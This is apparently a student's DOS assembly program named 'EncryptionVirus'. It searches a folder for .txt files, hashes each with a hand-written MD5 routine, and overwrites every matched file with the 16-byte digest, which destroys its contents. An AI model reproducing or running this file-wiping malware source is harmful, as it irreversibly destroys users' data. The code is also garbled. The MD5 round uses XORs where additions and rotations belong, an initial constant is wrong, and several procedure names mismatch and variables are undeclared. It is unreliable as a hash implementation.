Include irvine16.inc

FileControlBlock struc 	;File Data
db 22 dup(?) 			;header info 
FileTime dw ? 			;time stamp of file
FileDate dw ? 			;date stamp of file
FileSize dd ? 			;size of file
FileName db 13 dup(0) 	;name of file found by DOS
FileControlBlock ends

.DATA
FolderPath db "C:\N\*.txt",0 	;Path of search folder
DTA FileControlBlock <>			;Point the file data struct to user-defined DTA
BufferSize = 64					;To read 512-bit per time (64 byte)
FileFullPath db 13 DUP(?),0		;File full path after adding name found by DOS to it
Buffer db bufferSize dup(0),0	;Buffer to read data from file to it
CurrentSize dw 0				;Indicator to file size to be used in padding (step in MD5)

RotationIndex Byte 0			;Index to Rotation array to indicate number of rotations per round
TIndex Word 0					;Index to T array to use per round
K Byte 0

A DWord 01234567h
B DWord 89ABCDEFh
C DWord 0FEDCBA98h
D DWord 78543210h

T DWord 0D76AA478h,0E8C7B756h,242070DBh,0C1BDCEEEh,0F75C0FAFh,4787C62Ah,0A8304613h,0FD469501h,698098D8h,8B44F7AFh,0FFFF5BB1h,895CD7BEh,6B901122h,0FD987193h,0A679438Eh,49B40821h,
		0F61E2562h,0C040B340h,265E5A51h,0E9B6C7AAh,0D62F105Dh,02441453h,0D8A1E681h,0E7D3FBC8h,21E1CDE6h,0C33707D6h,0F4D50D87h,455A14EDh,0A9E3E905h,0FCEFA3F8h,676F02D9h,8D2A4C8Ah
		0FFFA3942h,8771F681h,699D6122h,0FDE5380Ch,0A4BEEA44h,4BDECFA9h,0F6BB4B60h,0BEBFBC70h,289B7EC6h,0EAA127FAh,0D4EF3085h,04881D05h,0D9D4D039h,0E6DB99E5h,1FA27CF8h,0C4AC5665h
		0F4292244h,432AFF97h,0AB9423A7h,0FC93A039h,655B59C3h,8F0CCC92h,0FFEFF47Dh,85845DD1h,6FA87E4Fh,0FE2CE6E0h,0A3014314h,4E0811A1h,0F7537E82h,0BD3AF235h,2AD7D2BBh,0EB86D391h

Rotation Byte 7,12,17,22,7,12,17,22,7,12,17,22,7,12,17,22,
			  5,9,14,20,5,9,14,20,5,9,14,20,5,9,14,20,
			  4,11,16,23,4,11,16,23,4,11,16,23,4,11,16,23,
			  6,10,15,21,6,10,15,21,6,10,15,21,6,10,15,21
			  
HashedData DWord 4 DUP(?)

			  
.CODE
mov AX,@data		;Initialize Data segment
mov DS,AX
Call EncryptionVirus
Quit::
.EXIT 
main ENDP
END main

;----------------------------------------------------------------------------
;Get first file with specific extension from the given folder
;Recieves: SI contain offset of the path to search in
;Returns Data of first file found
;----------------------------------------------------------------------------
FindFirstFile PROC
mov AH,1Ah			;Set DTA
mov DX,offset DTA	;point DX to DTA returned by OS
int 21h

mov AH , 4Eh					;Dos function search for 1st matching file
mov CX , 1						;Normal attribute
mov DX , SI
int 21h    
JC Quit                             ; call Dos
RET
FindFirstFile ENDP

;----------------------------------------------------------------------------
;Get next file with specific extension from the given folder
;Recieve Nothing
;Returns Data of current file found
;----------------------------------------------------------------------------
FindNextFile PROC
mov AH, 4Fh
int 21h
JC Quit
RET
FindNextFile ENDP

;----------------------------------------------------------------------------
;append file name to the folder path
;Recieve: SI contain offset of folder path
;		: DI contain offset that will contain file full path
;Returns FileFullPath contains the full path of file including file name
;----------------------------------------------------------------------------
GetFilePath PROC USES ECX
CopyPath:					;Copy folder path into FileFullPath var
CMP Byte Ptr [SI],'*'
JE Break
MOVSB
JMP CopyPath

Break:
mov CX,LENGTHOF DTA.FileName
mov SI,offset DTA.FileName

REP MOVSB					;Append file name to file full path

RET
GetFilePath ENDP

;----------------------------------------------------------------------------
;Open current found file
;Recieve: DX contain offset of file path
;Returns Nothing
;----------------------------------------------------------------------------
OpenFile PROC USES EAX
mov AH,3Dh			;Open file
mov AL,2			;Choose the input mode(2 to read&write)
int 21h
JC Quit
mov FileHandle,AX
RET
OpenFile ENDP

;----------------------------------------------------------------------------
;Read current opened file
;Recieve: Nothing
;Returns AX conatains number of bytes retrieved from the file 
;----------------------------------------------------------------------------
ReadFile PROC USES ECX,EDX
mov CX,  BufferSize		;Number of bytes to read 
mov DX,offset Buffer                                              
int 21h  
JC Quit
RET
Readfile ENDP

;----------------------------------------------------------------------------
;Write file data after hashing in the same file
;Recieve: SI contain offset of array contains final A,B,C,D
;		: DX conatain offset of the file full path
;Returns Nothing
;----------------------------------------------------------------------------
WriteEncryptedData PROC USES EAX,ECX,EBX
mov AH , 3Ch			;If the file already exist overwrite data in it, If file not exist create it
mov CX , 0				;Normal attribute
int 21h
JC Quit
mov AH , 40h			;Write data to file
mov CX , 16				;To write 128-bit returned from Md5
mov BX , FileHandle
int 21h
JC Quit
mov AH , 3Eh			;Close File
int 21h
RET
WriteEncryptedData ENDP

;----------------------------------------------------------------------------
;Multpliy two numbers
;Recieves: EDI Contains the first number
;		 : K Contains the second number
;Returns : EDI Contains the result of the multiplication
;----------------------------------------------------------------------------
Multpliy PROC USES ECX
mov ECX,EDI
L:
ADD EDI,K
LOOP L
RET
Multiply ENDP

;----------------------------------------------------------------------------
;The First Funnction of MD5 Encryption (F(B,C,D)=(B AND C) OR (NOT B AND D)
;Recieves: Values of B,C,D
;Returns EBX Contains the value returned form the equation
;----------------------------------------------------------------------------
F PROC USES ECX
mov EBX,B
AND EBX,C	;EBX=(B AND C)
mov ECX,B
neg ECX
AND ECX,D	;ECX=(NOT B AND D)
OR EBX,ECX
RET
F ENDP

;----------------------------------------------------------------------------
;The Second Funnction of MD5 Encryption (G(B,C,D)=(B AND D) OR (C AND NOT D)
;Recieves: Values of B,C,D
;Returns EDX Contains the value returned form the equation
;----------------------------------------------------------------------------
G PROC USES EBX
mov EBX,B
AND EBX,D	;EBX= (B AND D)
mov EDX,D
neg EDX
AND EDX,C	;EDX=(C AND NOT D)
OR EDX,EBX
RET
G ENDP

;----------------------------------------------------------------------------
;The Third Funnction of MD5 Encryption (H(B,C,D)=B XOR C XOR D
;Recieves: Values of B,C,D
;Returns EAX Contains the value returned form the equation
;----------------------------------------------------------------------------
H PROC
mov EAX,B
XOR EAX,C	;EAX=(B XOR C)
XOR EAX,D
RET
H ENDP

;----------------------------------------------------------------------------
;The Fourth Funnction of MD5 Encryption (I(B,C,D)=C XOR (B OR NOT D)
;Recieves: Values of B,C,D
;Returns ECX Contains the value returned form the equation
;----------------------------------------------------------------------------
I PROC USES EBX
mov ECX,C
mov EBX,D
neg EBX
OR EBX,B	;EBX=(B OR NOT D)
XOR ECX,EBX
RET
I ENDP

;----------------------------------------------------------------------------
;The Funnction of MD5 
;Recieves: EAX Contains result of one of the four encryption functions.
;		 : EBX Contains 32-bit block of data from current 512 bit block.
;		 : IterationIndex Conatins the index of the current round.
;Returns (Modify) the values of the four variables A,B,C,D
;----------------------------------------------------------------------------
MD5 PROC USES EDX

XOR EAX,A							;EAX=(EAX XOR A)
XOR EAX,EBX							;EAX=(EAX XOR EBX)
XOR EAX,T[TIndex]			;EAX=(EAX XOR Table)
XOR EAX,Rotation[RotationIndex]	;EAX=(EAX Rotated)
XOR EAX,B							;EAX=(EAX XOR B)

mov EDX,D
mov A,EDX
mov EDX,C
mov D,EDX
mov EDX,B
mov C,EDX
mov B,EAX

RET
MD5 ENDP

;----------------------------------------------------------------------------
;The Funnction of MD5Controller 
;Recieves:Nothing
;Returns :Nothing
;----------------------------------------------------------------------------
MD5Controller PROC

mov ECX,16
FCall:
mov SI,offset BUFFER+(k*4)
INC K
Call F
mov EAX,EBX
mov EBX,[SI]
Call MD5
INC RotationIndex
ADD TIndex,TYPEOF T
LOOP FCall

mov K,0
mov ECX,16
GCall:
mov EDI,5
Call Multiply
mov K,EDI
ADD K,1
mov K,EAX
mov EDX,0
mov EBX,16
DIV 16
mov K,EDX
mov SI,offset BUFFER+(k*4)
Call G
mov EAX,EDX
mov EBX,[SI]
Call MD5
INC RotationIndex
ADD TIndex,TYPEOF T
LOOP GCall

mov K,0
mov ECX,16
HCall:
mov EDI,3
Call Multiply
mov K,EDI
ADD K,5
mov K,EAX
mov EDX,0
mov EBX,16
DIV 16
mov K,EDX
mov SI,offset BUFFER+(k*4)
Call H
mov EBX,[SI]
Call MD5
INC RotationIndex
ADD TIndex,TYPEOF T
LOOP HCall

mov K,0
mov ECX,16
ICall:
mov EDI,7
Call Multiply
mov K,EDI
mov K,EAX
mov EDX,0
mov EBX,16
DIV 16
mov K,EDX
mov SI,offset BUFFER+(k*4)
PUSH ECX
Call I
mov EAX,ECX
mov EBX,[SI]
Call MD5
INC RotationIndex
ADD TIndex,TYPEOF T
POP ECX
LOOP ICall
RET
MD5Contoller ENDP

;----------------------------------------------------------------------------
;The Main Controller of the project to call all functions
;Recieves: Nothing
;Returns : Nothing
;----------------------------------------------------------------------------
EncryptionVirus PROC
mov SI , offset FolderPath
Call FindFirstFile

EncryptFiles:
mov DI ,offset FileFullPath
Call GetFilePath
mov DX,offset FileFullPath
Call OpenFile

mov AH,3Fh				;Read from file
mov BX,FileHandle
ReadData:
CMP AX , 0
JE EndOfFile 
mov CurrentSize , AX
Call MD5Controller                                                                             
JMP ReadData

EndOfFile:
;Call Padding
;Call MD5Controller
mov HashedData[0],A
mov HashedData[4],B
mov HashedData[8],C
mov HashedData[12],D

mov AH , 3Eh			;Close file
int 21h

mov SI,offset HashedData
mov DX,offset FileFullPath
Call WriteEncryptedData

Call FindNextFile

JMP EncryptFiles

RET
EncryptionVirus ENDP